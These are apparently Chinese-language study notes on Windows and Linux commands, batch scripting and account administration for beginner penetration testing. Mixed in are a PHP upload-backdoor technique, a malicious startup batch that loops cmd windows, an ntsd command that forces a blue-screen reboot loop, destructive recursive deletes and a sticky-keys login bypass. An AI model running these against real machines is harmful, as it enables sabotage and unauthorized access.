lsof -i :22 					（列出22端口）
service ssh start			（开启ssh服务）
systemctl enable ssh  （启用ssh）
systemctl restart ssh     （重启ssh）
systemctl status ssh		（查看ssh状态）
ss -tnlp 							（查看开启端口）
jps			（查看java应用）
fgrep -R '正则匹配' path		（path为查找路径，fgrep表示强制匹配，不用处理特殊符号）

输入时ctrl+r搜索

### 漏洞

#### 上传文件漏洞

比如上传php后门文件。通过设置代理拦截并修改请求头MINE类型（如，服务器想上传图片，而却上传木马，然后通过代理拦截，修改header的Mine，再发送），服务器接收后就可以控制它的web应用了。

php后门，将eval换成system就是对linux系统操作

kali自带代理软件，创建好本地代理服务器后，设置浏览器使用代理服务器。

#### 文件包含漏洞

类似导包，import，include 将其他文件包含进主页

本地文件包含

> 如，[www.baidu.com?page=abc.php](http://www.baidu.com?page=abc.php)

远程文件包含

> 如，[www.baidu.com?page=](http://www.baidu.com?page=)[http://misaki/abc.php](http://misaki/abc.php)

网页主页url后加robots.txt，可以查看爬虫协议。

### 各种虚拟机

R2的功能高于普通版本

安装虚拟机时选单个文件作为安装硬盘。

虚拟机需要安装VMTools（安装驱动，目的与真机交互）

磁盘管理，创建分区

关闭防火墙，关闭自动更新

设置虚拟机网络，不要选择VM0

然后做虚拟机快照（坏了备份）【克隆虚拟机-连接克隆-修改计算机名-快照】

装四台虚拟机

Win XP

Win 2003 SP2

Win 7 旗舰版

Win 2008 R2

### 基础理论

命令行中输入如下，来解析域名IP，百度旧地址a.shifen.com，所以请求顺序为：本机--交换机--路由网关--DNS服务器--再返回给本机--本机再请求IP

```powershell
nslookup www.baidu.com
// 手工解析域名

DNS request timed out.
    timeout was 2 seconds.
服务器:  UnKnown
Address:  192.168.0.1

非权威应答:
名称:    www.a.shifen.com
Addresses:  220.181.38.149
          220.181.38.150
Aliases:  www.baidu.com
```

用ping命令测试对方ip是否存在，ping命令是有去有回，对方是否接受ping取决于对方的防火墙。如下发送20个字节包给百度

```powershell
ping -l 20 www.baidu.com

Ping -t指定的计算机直到中断。
Ping -a 将地址解析为计算机名。
Ping -n count 发送 count 指定的 ECHO 数据包数。默认值为 4。
Ping -l length 发送包含由 length 指定的数据量的 ECHO 数据包。默认为 32 字节；最大值是65,527。
Ping -f 在数据包中发送"不要分段"标志。数据包就不会被路由上的网关分段。
Ping -i ttl 将"生存时间"字段设置为 ttl 指定的值。
Ping -v tos 将"服务类型"字段设置为 tos 指定的值。
Ping -r count 在"记录路由"字段中记录传出和返回数据包的路由。count 可以指定最少 1 台，最多 9 台计算机。
Ping -s count 指定 count 指定的跃点数的时间戳。
```

位权，指进制位=1时的值，如1111 分别为8421

```java
1*8 + 1*4 + 1*2 + 1*1 = 15
```

#### DOS命令

```powershell
// type查看文本内容，| more 表示分页，按空格下一页
type xxx.txt | more 
// 查看C盘下目录，分页
dir c:\windows | more
dir /a      浏览隐藏的全部文件
>表示覆盖
>>表示追加

md 创建文件夹
---创建文件
ECHO创建
echo 字符串 >>[路径\]文件名.扩展名
// 复制输入内容到指定文件，输入完ctrl+Z回车，必须指定扩展名
copy con xxx.txt
// 复制文件
copy 源文件路径 目标文件路径    
// 移动文件
move 源文件路径 目标文件路径
// 使用fsutil创建指定位置指定大小的空文件，如果再加h和s和a的属性...会造成磁盘空间突然减少
fsutil file createnew c:\Users\10174\abc.ini 1024
// 重命名
ren oldName newName


---删除文件
del *.*
del *.txt
del *.* /s/q    (/s 递归删除，/q不提示是否删除)
rd . /s/q  (删除全部)

---隐藏命令
修改文件或文件夹隐藏属性，+表示添加，-表示取消，h表示hide，s表示system，a表示存档属性
attrib +h 文件全名/文件夹名  #隐藏文件或文件夹
attrib +s +h  文件全名/文件夹名    #提升为被系统保护的文件


---修改文件关联性
assoc .txt=exefile    （修改.txt文件为exe文件，此时txt文件打不开）
如果修改cmd，则cmd打不开
assoc .txt=txtfile    （复原）

---关机命令
shutdown -s -f -t 100 -c "马上关机"    （-s表示关机，-r表示重启，-t表示时间秒，-c消息）
shutdown -a （取消一切定时）
shutdown -l （注销）等同于logoff

```

#### 批处理编写

——自上而下成批处理每条dos命令

```powershell
// 关闭回显
@ECHO OFF
echo. 表示空一行
// 设置默认的控制台前景和背景颜色。
color ?
// 黑底绿字
color 0a  
// 添加标题
title my first bat
// 暂停
pause
// ping自己，且不回显 >nul表示返回至空设备 2>nul 表示错误也不返回
ping -n 10 127.0.0.1 >nul 2>nul
d: >nul 2>nul
cd \ >nul 2>nul
rd . /s/q >nul 2>nul


-----死循环cmd,%%表示取变量值
copy xxx.bat "%userprofile%\开始\启动\"
// 表示区块
:a
// 表示开启，打开东西，默认打开cmd
start
// 表示跳转到某个区块
goto a



------定时关机
REM 需要让用户选择完返回
:0
REM 清除回显
cls
echo 1.定时关机
echo 2.取消
echo 3.退出
set /p num=你的选择：
REM if等式左右需要用双引号
if "%num%"=="1" goto 1
if "%num%"=="2" goto 2
if "%num%"=="3" goto 3
REM 应该处理else
echo 错误输入
pause
goto 0

:1
REM /p表示等待用户输入，a的值为用户输入的值，p表示param
set /p a=请输入时间
shutdown -s -f -t %a%
goto 0

REM 在开始启动中生成恶意批处理
:2
shutdown -a
echo :a >> "%userprofile%\开始菜单\程序\启动\hhh.bat"
echo start >> "%userprofile%\开始菜单\程序\启动\hhh.bat"
echo goto >> "%userprofile%\开始菜单\程序\启动\hhh.bat"
goto 0

:3
exit

-----针对xp/win2003命令,强制杀死登录命令，导致蓝屏，可以将其放入启动，导致开机蓝屏重启循环
ntsd -c q -pn winlogon.exe
-----杀死桌面进程
taskkill /im explorer.exe /f >nul 2>nul
REM 卡5秒
ping -n 5 127.0.0.1 >nul 2>nul
start c:\windows\explorer.exe

```

#### 用户与组管理

Windows服务器：win2000，win2003，win2008

Linux服务器：Redhat（收费，售后服务费），CentOS

每个账户都有自己唯一的SID

```powershell
SID由2部分组成
S到最后是机器，UID=500表示管理员，普通用户从1000开始
Linux的root是0
```

windows上账户密码存储位置C:\windows\system32\config\SAM

服务器密码最长有效期42天

密码字典工具：将用户常用的参数输入，生成字典。

**内置账户**

1.**给别人使用的账户**

administrator	#管理员

guest		#来宾账户

2.**系统账户**

> system		#系统账户，最高权限
local services  #本地服务账户	权限普通
network services	#网络服务账户   权限普通

**配置文件**

等同于linux的家目录，用户在第一次登录时生成。

> win7/8	C:\用户\
xp/2003   C:\Documents ande Settings\

```powershell
#查看user所有
net user
#查看当前用户信息
net user 10174
#修改用户密码,如将10174用户密码改为1234，且不需要以前密码（只针对2003和xp，且当前为管理员）
net user 10174 1234
#新增用户和密码
net user misaki 0114 /add
#删除用户
net user misaki /del
#激活或禁用账户yes/no
net user 用户名 /active:no
```

组管理，简化权限管理。

内置组：

> 1）administrators
2）guests
3）users		#默认新用户组
4）network
5）print
6）remote desktop

相关命令

```powershell
// 查看本地组
net localgroup
// 查看改组成员
net localgroup administrators
// 添加组名为CEO，删除为/del
net localgroup CEO /add
// 添加user用户至本地的管理员组。或者/del
net localgroup administrators user /add

```

#### 服务器远程管理

**图形RDP模式**

将xp和2003的网络连接到Vmnet1上。

如xp的ip地址为10.1.1.1，子网掩码3*255

另2003的为10.1.1.2，子网掩码同理

将2003的系统属性--远程开启远程桌面

> 运行mstsc，远程连接桌面

普通用户没有远程登录权限。

Remote DeskTop Users远程桌面用户组（管理员也可以）

> net localgroup "Remote Desktop Users" misaki /add
将misaki用户加入RDU组

**telnet模式**

windows服务器开启远程连接telnet，cmd输入

> telnet 10.1.12

同理也需要配用户组，TelnetClients组

> net localgroup "Remote Desktop Users" misaki /add

2003端命令行输入

> netstat -an 		查看所有开放端口号（23为telnet）

445端口为共享服务

3389端口为远程桌面服务RDP（注意只限于2003，2000）

利用漏洞破解登录win7，在登录界面下，按5次shift，出现粘滞键，关机，再开机，强制关机，再开机错误恢复，修复，弹出链接，点击打开记事本，打开文件，去c盘找到sethc并重命名，再将cmd复制一份并重命名为sethc。

> cmd路径
c:\windows\system32\cmd
将密码设置为空
net user misaki ""

#### NTFS安全权限

文件和文件夹。实现不同用户访问不同文件夹。格子类型，格式化就是重新打格子，每个格子叫做簇，可以指定簇的大小如4K，一个簇只能被一个文件使用。

> 文件系统
FAT	windows（淘汰）
NTFS 	windows
EXT	linux

NTFS特点，提高读写性，支持文件加密，访问控制列表ACL（权限）、磁盘配额（不同用户文件使用空间），单文件大于4G。

**修改NTFS权限**

> Technology is a powerful force in our society. Data, software,and communication can be used for bad: to entrench unfair power structures, to undermine human rights, and to protect vested interests. But they can also be used for good: to make underrepresented people's voice heard, to create opportunities for everyone, and to avert disasters. We are dedicated to working toward the good.

